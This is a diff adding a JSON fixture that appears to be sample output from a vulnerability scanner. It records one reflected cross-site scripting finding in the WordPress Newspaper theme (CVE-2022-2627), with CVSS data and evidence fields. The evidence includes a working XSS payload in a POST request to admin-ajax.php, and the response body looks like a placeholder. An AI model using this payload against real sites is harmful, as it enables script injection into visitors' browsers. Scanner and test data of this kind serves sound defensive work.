@@ -1,0 +1,43 @@
+[
+    {
+        "name": "WordPress Newspaper < 12 - Cross-Site Scripting (CVE-2022-2627)",
+        "occurred": "2024-05-30T11:55:13+00:00",
+        "external_status": "",
+        "severity": 2,
+        "CustomFields": {
+            "hv_module": "deepscan",
+            "updated_date": "2024-09-18T09:08:54+00:00",
+            "id": "HVI-23813230",
+            "timestamp": 1717070113000,
+            "progress_status": "New",
+            "asset": "172.17.20.4:443",
+            "ip": "172.17.20.4",
+            "port": 443,
+            "uri": "http://172.17.20.4/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2",
+            "url": "http://172.17.20.4",
+            "issue_type": "Vulnerability",
+            "issue_description": "WordPress Newspaper theme before 12 is susceptible to cross-site scripting. The theme does not sanitize a parameter before outputting it back in an HTML attribute via an AJAX action.\n",
+            "cpe": "cpe:2.3:a:tagdiv:newspaper:*:*:*:*:*:wordpress:*:*",
+            "cve_id": [
+                "cve-2022-2627"
+            ],
+            "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+            "cvss_score": 6.1,
+            "epss_score": 0.00119,
+            "known_exploited": false,
+            "hackerview_link": "https://platform.ctm360.com/hackerview/deepscan/issues/resolved/HVI-23813230",
+            "evidence": {
+                "request": "POST /wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 HTTP/1.1\r\nHost: 172.17.20.4\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 146\r\n\r\naction=td_ajax_loop&loopState[moduleId]=--><form><math><img+onerror=alert(1)+src=1><mtext></form>",
+                "response": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n<!-- wp_booster error: reflected XSS PoC in moduleId -->",
+                "curl_command": "curl -X POST -d 'action=td_ajax_loop&loopState[moduleId]=test' -H 'Content-Type: application/x-www-form-urlencoded' 'http://172.17.20.4/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2'"
+            },
+            "domain": "",
+            "asset_type": "services",
+            "host": [
+                "example.com",
+                "www.example.com"
+            ],
+            "brand": "REPERSEA"
+        }
+    }
+]
